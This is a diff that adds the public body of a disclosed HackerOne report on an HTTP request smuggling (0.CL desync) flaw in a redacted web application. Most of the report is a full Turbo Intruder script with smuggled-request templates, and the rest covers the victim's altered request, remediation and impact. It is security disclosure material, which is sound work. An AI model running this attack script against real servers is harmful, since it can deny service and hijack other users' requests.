@@ -8,6 +8,7 @@ tags:
 substate: "resolved"
 weakness: "HTTP Request Smuggling"
 enriched: true
+body: true
 date: 2026-05-20
 submitted: 2026-03-06T13:15:49.812Z
 bounty_usd: null
@@ -25,6 +26,171 @@ title: "HTTP Request Smuggling"
 - Report: [https://hackerone.com/reports/3589269](https://hackerone.com/reports/3589269)
 - CWE: HTTP Request Smuggling
 - Submitted: 2026-03-06T13:15:49.812Z
+
+## Report body
+
+Public report body - fetched from `https://hackerone.com/reports/<id>.json` (the site's own disclosed-report data route).
+
+## Summary:
+HTTP Request Smuggling is a vulnerability stemming from HTTP/1.1's core weakness, the boundaries between requests on keep-alive connections. In this case, it was possible to achieve a 0.CL desync. This means that it is possible to create a request with a malformed `Content-Length` header, where the frontend ignores the content-length header, but the backend processes it. This discrepancy allows an attacker to take control of other users' requests achieving a range of critical impacts. For more information on request smuggling, and 0.CL desync in general, please refer to this research:
+
+[0.CL Desync Attacks](https://portswigger.net/research/http1-must-die#0.cl-desync-attacks)
+
+## Steps To Reproduce:
+1. In Burp Suite, send any valid request who's target is set to `████████` to turbo intruder
+2. Paste the following turbo intruder script into the script window
+```python
+# Refer to https://portswigger.net/research/http1-must-die
+def queueRequests(target, wordlists):
+    engine = RequestEngine(endpoint=target.endpoint,
+                           concurrentConnections=100,
+                           requestsPerConnection=1,
+                           engine=Engine.BURP,
+                           maxRetriesPerRequest=0,
+                           timeout=15
+                           )
+
+    # The attack should contain an early-response gadget and a (maybe obfuscated) Content-Length header with the value set to %s
+    stage1 = '''POST /CON HTTP/1.1
+Host: '''+host+'''
+Cookie: baca8f7410f46004b3ebdb56efffd64ce7cc73784001204a5fdd719816850df2=7ce2a3d9e711f9458d5fb71d02dcfaaaeeb2b7bf758fe15ddcb88d58b00c6e9a202a523d
+Pragma: no-cache
+Cache-Control: no-cache
+Sec-Ch-Ua-Platform: "Linux"
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.6723.44 Safari/537.36
+Sec-Ch-Ua: "Not:A-Brand";v="99", "HeadlessChrome";v="145", "Chromium";v="145"
+Sec-Ch-Ua-Mobile: ?0
+Accept: */*
+Sec-Fetch-Site: same-origin
+Sec-Fetch-Mode: no-cors
+Sec-Fetch-Dest: script
+Referer: https://████████/
+Accept-Encoding: gzip, deflate, br
+Content-Type: application/x-www-form-urlencoded
+Connection: keep-alive
+Content-length: 
+ %s
+
+'''
+
+    # This will get prefixed to the victim's request - place your payload in here
+    smuggled = '''TRACE /assets HTTP/1.1
+X: x'''
+
+
+
+    # If the server doesn't like GET with a body, try OPTIONS etc
+    stage2_chopped = '''GET / HTTP/1.1
+Content-Length: 123
+X: Y'''
+
+    stage2_revealed = '''GET /robots.txt HTTP/1.1
+Host: '''+host+'''
+Cookie: baca8f7410f46004b3ebdb56efffd64ce7cc73784001204a5fdd719816850df2=7ce2a3d9e711f9458d5fb71d02dcfaaaeeb2b7bf758fe15ddcb88d58b00c6e9a202a523d
+Pragma: no-cache
+Cache-Control: no-cache
+Sec-Ch-Ua-Platform: "Linux"
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.6723.44 Safari/537.36
+Sec-Ch-Ua: "Not:A-Brand";v="99", "HeadlessChrome";v="145", "Chromium";v="145"
+Sec-Ch-Ua-Mobile: ?0
+Accept: */*
+Sec-Fetch-Site: same-origin
+Sec-Fetch-Mode: no-cors
+Sec-Fetch-Dest: script
+Referer: https://████████/
+Accept-Encoding: gzip, deflate, br
+Content-Type: application/x-www-form-urlencoded
+Connection: keep-alive
+
+'''
+
+    victim = '''GET / HTTP/1.1
+Host: '''+host+'''
+Cookie: baca8f7410f46004b3ebdb56efffd64ce7cc73784001204a5fdd719816850df2=7ce2a3d9e711f9458d5fb71d02dcfaaaeeb2b7bf758fe15ddcb88d58b00c6e9a202a523d
+Pragma: no-cache
+Cache-Control: no-cache
+Sec-Ch-Ua-Platform: "Linux"
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.6723.44 Safari/537.36
+Sec-Ch-Ua: "Not:A-Brand";v="99", "HeadlessChrome";v="145", "Chromium";v="145"
+Sec-Ch-Ua-Mobile: ?0
+Accept: */*
+Sec-Fetch-Site: same-origin
+Sec-Fetch-Mode: no-cors
+Sec-Fetch-Dest: script
+Referer: https://████████/
+Accept-Encoding: gzip, deflate, br
+Content-Type: application/x-www-form-urlencoded
+Connection: keep-alive
+
+'''
+
+    # No need to edit below this line
+    if '%s' not in stage1:
+        raise Exception('Please place %s in the Content-Length header value')
+
+    if not stage1.endswith('\r\n\r\n'):
+        raise Exception('Stage1 request must end with a blank line and have no body')
+
+
+    while True:
+        engine.queue(stage1, len(stage2_chopped), label='stage1', fixContentLength=False)
+        engine.queue(stage2_chopped + stage2_revealed + smuggled, label='stage2')
+        engine.queue(victim, label='victim')
+
+
+def handleResponse(req, interesting):
+    if req.label == "victim":
+        table.add(req)
+
+    # 0.CL attacks use a double desync so they can take a while!
+
+
+```
+3. Select "Attack" and wait.
+4. In the results table, you can see a simulated victim, interacting with the application. Note that their request towards the home page, occasionally produces a 405 response, instead of the normal 200 response. 
+████████
+
+This is achieved because the script is configured with the following prefix.
+```python
+    # This will get prefixed to the victim's request - place your payload in here
+    smuggled = '''TRACE /assets HTTP/1.1
+X: x'''
+```
+
+When the victim's request ends up appended to this prefix, their request looks like this:
+```http
+TRACE /assets HTTP/1.1
+X: xGET / HTTP/1.1
+Host: ████████
+Cookie: baca8f7410f46004b3ebdb56efffd64ce7cc73784001204a5fdd719816850df2=7ce2a3d9e711f9458d5fb71d02dcfaaaeeb2b7bf758fe15ddcb88d58b00c6e9a202a523d
+Pragma: no-cache
+Cache-Control: no-cache
+Sec-Ch-Ua-Platform: "Linux"
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.6723.44 Safari/537.36
+Sec-Ch-Ua: "Not:A-Brand";v="99", "HeadlessChrome";v="145", "Chromium";v="145"
+Sec-Ch-Ua-Mobile: ?0
+Accept: */*
+Sec-Fetch-Site: same-origin
+Sec-Fetch-Mode: no-cors
+Sec-Fetch-Dest: script
+Referer: https://████████/
+Accept-Encoding: gzip, deflate, br
+Content-Type: application/x-www-form-urlencoded
+Connection: keep-alive
+
+
+```
+
+
+# Remediation
+The most robust remediation for request smuggling is to *never* use HTTP/1 upstream. That means, that besides your very first proxy, *every* web server, including the backend origin server, should use HTTP/2 end-to-end. However, this is often unachievable due to some vendors refusal to adopt HTTP/2 right now. If this is not possible in your case, you must implement *consistent* and *strict* HTTP request and response parsing across *all* proxies in your infrastructure. This often involves configuration proxies to use strict parsing measures in their configuration files. You can find all kinds of advice on this approach at the following link:
+[http1mustdie.com](https://http1mustdie.com/)
+
+## Impact
+
+On it's own, this produces a denial of service vulnerability, where regular user traffic produces unexpected 405 errors, rendering the application unusable. However, the same technique can usually chained with other gadgets and vulnerabilities in order to take full control of the application. This is often achieved via a variety of impacts including response queue poisoning, global cross-site scripting, cache poisoning / deception, open redirection and access control bypasses. You can find more information on the plethora of impacts in the following web academy notes:
+
+[Exploiting Request Smuggling](https://portswigger.net/web-security/request-smuggling/exploiting)
 
 ## Timeline
 
